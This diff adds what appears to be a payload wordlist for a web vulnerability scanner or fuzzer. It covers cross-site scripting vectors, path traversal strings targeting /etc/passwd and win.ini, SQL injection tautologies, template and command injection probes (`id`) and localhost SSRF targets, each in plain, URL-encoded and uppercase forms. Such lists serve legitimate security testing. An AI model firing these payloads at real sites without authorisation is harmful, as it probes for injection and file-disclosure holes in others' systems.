@@ -1,0 +1,80 @@
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+"><script>alert(1)</script>
+<body onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<details open ontoggle=alert(1)>
+<input autofocus onfocus=alert(1)>
+<math><mtext></mtext><annotation-xml encoding=text/html><script>alert(1)</script></annotation-xml></math>
+javascript:alert(1)
+test
+baseline
+AUROSE_PROBE
+../../../../etc/passwd
+..\..\..\..\windows\win.ini
+' OR '1'='1
+" OR "1"="1
+${7*7}
+{{7*7}}
+`id`
+127.0.0.1
+http://127.0.0.1
+https://example.com
+%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
+%3Csvg%2Fonload%3Dalert%281%29%3E
+%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+%3Cbody%20onload%3Dalert%281%29%3E
+%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E
+%3Cdetails%20open%20ontoggle%3Dalert%281%29%3E
+%3Cinput%20autofocus%20onfocus%3Dalert%281%29%3E
+%3Cmath%3E%3Cmtext%3E%3C%2Fmtext%3E%3Cannotation-xml%20encoding%3Dtext%2Fhtml%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3C%2Fannotation-xml%3E%3C%2Fmath%3E
+javascript%3Aalert%281%29
+..%2F..%2F..%2F..%2Fetc%2Fpasswd
+..%5C..%5C..%5C..%5Cwindows%5Cwin.ini
+%27%20OR%20%271%27%3D%271
+%22%20OR%20%221%22%3D%221
+%24%7B7%2A7%7D
+%7B%7B7%2A7%7D%7D
+%60id%60
+http%3A%2F%2F127.0.0.1
+https%3A%2F%2Fexample.com
+<SCRIPT>ALERT(1)</SCRIPT>
+<IMG SRC=X ONERROR=ALERT(1)>
+<SVG/ONLOAD=ALERT(1)>
+"><SCRIPT>ALERT(1)</SCRIPT>
+<BODY ONLOAD=ALERT(1)>
+<IFRAME SRC=JAVASCRIPT:ALERT(1)>
+<DETAILS OPEN ONTOGGLE=ALERT(1)>
+<INPUT AUTOFOCUS ONFOCUS=ALERT(1)>
+<MATH><MTEXT></MTEXT><ANNOTATION-XML ENCODING=TEXT/HTML><SCRIPT>ALERT(1)</SCRIPT></ANNOTATION-XML></MATH>
+JAVASCRIPT:ALERT(1)
+TEST
+BASELINE
+../../../../ETC/PASSWD
+..\..\..\..\WINDOWS\WIN.INI
+`ID`
+HTTP://127.0.0.1
+HTTPS://EXAMPLE.COM
+%3CSCRIPT%3EALERT%281%29%3C%2FSCRIPT%3E
+%3CIMG%20SRC%3DX%20ONERROR%3DALERT%281%29%3E
+%3CSVG%2FONLOAD%3DALERT%281%29%3E
+%22%3E%3CSCRIPT%3EALERT%281%29%3C%2FSCRIPT%3E
+%3CBODY%20ONLOAD%3DALERT%281%29%3E
+%3CIFRAME%20SRC%3DJAVASCRIPT%3AALERT%281%29%3E
+%3CDETAILS%20OPEN%20ONTOGGLE%3DALERT%281%29%3E
+%3CINPUT%20AUTOFOCUS%20ONFOCUS%3DALERT%281%29%3E
+%3CMATH%3E%3CMTEXT%3E%3C%2FMTEXT%3E%3CANNOTATION-XML%20ENCODING%3DTEXT%2FHTML%3E%3CSCRIPT%3EALERT%281%29%3C%2FSCRIPT%3E%3C%2FANNOTATION-XML%3E%3C%2FMATH%3E
+JAVASCRIPT%3AALERT%281%29
+..%2F..%2F..%2F..%2FETC%2FPASSWD
+..%5C..%5C..%5C..%5CWINDOWS%5CWIN.INI
+%60ID%60
+HTTP%3A%2F%2F127.0.0.1
+HTTPS%3A%2F%2FEXAMPLE.COM
+<img src%3Dx onerror%3Dalert(1)>
+<svg/onload%3Dalert(1)>
+<body onload%3Dalert(1)>
+<iframe src%3Djavascript:alert(1)>
+<details open ontoggle%3Dalert(1)>
+<input autofocus onfocus%3Dalert(1)>
